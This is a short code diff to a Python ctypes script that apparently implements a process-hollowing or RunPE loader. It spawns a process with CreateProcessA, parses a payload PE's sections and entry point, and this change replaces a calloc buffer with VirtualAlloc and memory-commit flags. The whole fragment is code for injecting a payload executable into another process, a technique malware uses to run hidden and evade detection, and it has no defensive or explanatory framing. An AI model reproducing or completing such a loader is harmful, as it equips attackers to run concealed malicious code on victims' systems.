@@ -103,7 +103,7 @@ if windll.kernel32.CreateProcessA(None,
                                None,
                                byref(startupinfo),
                                byref(processinfo)) == 0:
-       error(GetLastError())
+       error()
         
 
 hProcess = processinfo.hProcess
@@ -130,9 +130,14 @@ payload_NumberOfSections = payload.FILE_HEADER.NumberOfSections
 payload_AddressOfEntryPoint = payload.OPTIONAL_HEADER.AddressOfEntryPoint
 payload.close()
 
-payload_data_pointer = cdll.msvcrt.calloc(
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_READWRITE = 0x4
+
+payload_data_pointer = windll.kernel32.VirtualAlloc(None,
                                 c_int(payload_size+1),
-                                sizeof(c_char))
+                                MEM_COMMIT | MEM_RESERVE,
+                                PAGE_READWRITE)
 
 
 memmove(                        payload_data_pointer,
